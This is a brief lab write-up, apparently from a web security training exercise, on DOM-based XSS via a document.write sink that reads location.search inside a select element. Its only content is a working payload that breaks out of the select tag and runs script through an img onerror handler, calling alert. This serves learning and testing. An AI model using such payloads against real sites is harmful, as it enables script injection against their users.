# DOM XSS in document.write sink using source location.search inside a select element

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal:

Exploit the DOM XSS vulnerability to call the alert function.

### Analysis/Exploit:

</select><img src=1 onerror=alert(1)>

![](./images/417917d0701c_001.png)
